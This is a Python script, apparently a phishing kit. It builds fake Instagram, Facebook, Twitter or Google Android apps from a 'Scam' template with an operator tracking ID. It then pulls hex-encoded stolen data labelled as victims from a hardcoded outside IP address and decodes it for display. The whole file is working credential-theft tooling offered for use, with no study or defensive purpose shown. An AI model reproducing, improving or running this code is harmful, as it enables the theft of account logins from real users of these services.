import os
import shutil
import codecs
import requests
import platform
from bs4 import BeautifulSoup

CONTADOR=0
SYS=platform.system().lower()

ver_carpeta=os.listdir()

base_apk={

    1:"instagram",
    2:"facebook",
    3:"twitter",
    4:"google"

}

def crear(selec):
    REMP=base_apk.get(selec)
    
    try:
        idcap=input("[ID] Introduce tu ID de seguimiento: ")

        while len(idcap) == 0 or " " in idcap:
            idcap=input("[ID] Introduce tu ID de seguimiento valido: ")
    except:
        pass
    else:

        try:
            
            asset_save=open("Scam_2/assets/selec.rdp", "w")
            asset_save.write(REMP)
            asset_save.close()

            asset_save=open("Scam_2/assets/id.rdp", "w")
            asset_save.write(idcap)
            asset_save.close()

            """
            xml_open=codecs.open(".xml", "r", encoding="utf-8")
            xml_read=xml_open.read()
            xml_read=xml_read.replace("ID_MG", idcap).replace("SELEC_MG", REMP)
            xml_open.close()

            xml_open=open("main.xml", "wb", encoding="utf-8")
            xml_open.write(xml_read)
            xml_open.close() # Solucionar error de encode
            """
            # Movimiento de archivos
            #shutil.rmtree("Scam_2/res/layout/main.xml")
            #shutil.rmtree("Scam_2/res/drawable-xhdpi-v4/app_icon.png")

            shutil.move(f"Scam_2/res/drawable-xhdpi-v4/{REMP}.png", "Scam_2/res/drawable-xhdpi-v4/app_icon.png")

            if "win" in SYS:
                print("[APK] COMPRIME LA APK QUE SE ECNUENTRA EN:\n[PATH] {} ->> Scam_2/".format(os.getcwd()))
            else:
                os.chdir("Scam_2/")
                os.system("zip -r Lite.apk *")
                print("[APK] APK SIN FIRMA CREADA CON EXITO:\n[PATH] {} ->> Lite.apk".format(os.getcwd()))

            #shutil.move("main.xml", "Scam_2/res/layout/main.xml") 

        except:
            print("[ERROR] ALGO SUCEDIO X_X")
            pass
        
        else:
            #print()
            print("[CHECK] ->> LISTO")
            exit(0)



def obtener():
    global CONTADOR
    try:
        idcap=input("[ID] Introduce tu ID de seguimiento: ")

        while len(idcap) == 0 or " " in idcap:
            idcap=input("[ID] Introduce tu ID de seguimiento valido: ")

    except:
        pass

    else:
        try:
            obtiene=requests.get("http://192.71.249.244:60001/comments")
        except:
            print("[ERROR] ALGO SUCEDIO X_X")
            pass
        else:

            sopa=BeautifulSoup(obtiene.text, "html.parser")

            obtener=str(sopa.find_all(id="comments"))
            obtener=obtener.replace("<br/>", "\n")

            temp=open(".temp", "w", encoding="utf-8")
            temp.write(obtener)
            temp.close()

            temp=open(".temp", encoding="utf-8")
            temp_read=temp.readlines()

            chek=False

            for word in temp_read:
                word=word.replace("\n","")

                if idcap in word:
                    CONTADOR=CONTADOR+1
                    #print(word) DEVOLPING COMMENTS
                    chek=True

                    #print("\n[TARGET]->> SCAM.APK\n")
                    word=word.replace(idcap,"").replace(" ","").replace("</div>]","")
                    #print(word)
                    try:
                        print(f"[HEX] YOUR HEX CODE TARGET->> [{CONTADOR}]")
                        word=str(codecs.decode(word,"hex"))
                        print(word.replace("\\n","\n").replace("b'","[TARGET]->> SCAM.APK ->> ").replace("#'","\n").replace("%40","@").replace("%C3%B1","ñ"))
                    except:
                        print("[ERROR] HEX NO ENCONTRADO X_X")
                        exit(0)

            if chek == False:
                print("[ID] NO ENCONTRAMOS VICTIMAS RELACIONADAS A TU ID")
                exit(0)

            temp.close()
            os.remove(".temp")


print("""  
[01] INSTAGRAM
[02] FACEBOOK
[03] X-TWITTER
[04] GOOGLE
              
[05] CUSTOM APK [06] TRACK ID
""")
        
try:
    selec=int(input("sc4pk->>"))

    while selec < 1 or selec > 6:
        selec=int(input("sc4pk->>"))

except:
    pass
else:

    if selec < 5:

        try:
            if "Scam_2" in ver_carpeta:
                shutil.rmtree("Scam_2")
                shutil.copytree("Scam","Scam_2")
            else:
                shutil.copytree("Scam","Scam_2")    # Bloque encargado de verificar si hay el apk que se va a crear
        except:
            pass

        crear(selec)

    if selec == 6:
        obtener()
    
    if selec == 5:
        print("[???] EN DESARROLLO")
        exit(0)